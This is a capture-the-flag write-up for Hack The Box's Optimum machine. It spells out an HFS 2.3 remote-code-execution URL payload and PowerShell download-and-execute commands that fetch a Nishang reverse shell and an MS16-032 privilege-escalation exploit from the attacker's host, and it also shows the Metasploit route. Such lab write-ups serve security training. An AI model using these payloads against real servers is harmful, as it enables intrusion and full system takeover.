We are going to pwn Optimum from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/6>


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results

```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Network Distance: 2 hops

```
Only one port is opened which is ``HTTP``

## HTTP Enumeration

From the nmap result itself we know that the webpage is ``HttpFileServer httpd 2.3``

When I click the version, It redirects to it official homepage.
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/3.png)

Since we know the version I started searching for exploits available for the version and found this 

>https://www.exploit-db.com/exploits/34668

From the above exploit we can do ``RCE`` on the url.
We can execute it by using `/?search=%00{.exec|cmd.}` on the url

Now we need to get a reverse shell from this.

I used [Nishang](https://github.com/samratashok/nishang)

>Nishang is a framework of scripts and payloads that enables using PowerShell for offensive security. By using this we can get the shell.

There is a lot of Shell I choosed ``nishang/Shells/Invoke-PowerShellTcp.ps1`` and copied that to my directory.

If we look at the Shell it gives us some of the examples.
```
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
```

I copied one of the example and changed it to my IP and paste it in bottom of the file.<br/>
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/4.png)<br/>
This not only load the module but also the shell give me a callback.

## Getting User Shell

We need to start ``python`` server inorder to download it to the box. Started my ``netcat`` listener too.<br/>
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/5.png)<br/>

Now its time to upload the module to the box

I used Powershell to do that 

```powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Invoke-PowerShellTcp.ps1')```

I added the location of the ``powershell.exe`` in windows along with the command and we already know for ``RCE``.

```
/?search=%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Invoke-PowerShellTcp.ps1').}
```

With URL encoded I passed it to burp.<br/>
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/6.png)

``Status 200`` means it successfully downloaded to the box.<br/>
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/7.png)

At the sametime I got the shell in ``nc listener``

![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/8.png)

## Privilege Escalation

Once I got a shell the first thing I check is ``systeminfo``

![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/20.png)<br/>
I found some ``Hotfix's``

>A hotfix or quick-fix engineering update is a single, cumulative package that includes information that is used to address a problem in a software product.

So we can use [Sherlock](https://github.com/rasta-mouse/Sherlock) to find the missing patches which will help us to Privilege Escalation.

>Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.

`Sherlock.ps1`

So we need to ``Find AllVulns`` Copy that and paste it in the bottom of the file as we did before.<br/>
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/9.png)<br/>
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/10.png)

Our python server is already ON so we can download it in the box. No need to represent ``powershell(PS)`` because we already in a powershell.

> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Sherlock.ps1')

Once its executed it displays the output.<br/>

Only these are appears to be vulnerable.

VulnStatus : Appears Vulnerable
```

So I started from the first one which is ``MS16-032``. The [Powershell Empire](https://github.com/EmpireProject/Empire) have an exploit for this.

Its located in ``/data/module_source/privesc/Invoke-MS16032.ps1`` 

If we look at the script it gives the example of how it need to run.
```
 .EXAMPLE

        C:\PS> Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://google.com')"
```

``Invoke-MS16032.ps1``
Copy the example and paste it in the bottom of the file with changes. I copied the same``Invoke-PowerShellTcp.ps1`` which we use to get initial shell as ``root.ps1`` to give us another reverse shell.
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/12.png)

Note: ``Invoke-MS16032`` must be as same as in the top of the script.

``root.ps1``<br/>
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/13.png)

On the box:

>IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Invoke-MS16032.ps1')

![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/14.png)

We are System!!

## Method II (Using Metasploit)

> https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec

> use exploit/windows/http/rejetto_hfs_exec

Set LHOST and LPORT<br/>

![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/16.png)

For privilege escalation, background the session and start ``local_exploit_suggester``<br/>
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/17.png)

We already know its vulnerable to ``ms16_032``, So I used that exploit
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/18.png)<br/>
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/19.png)

We got authority\system !!
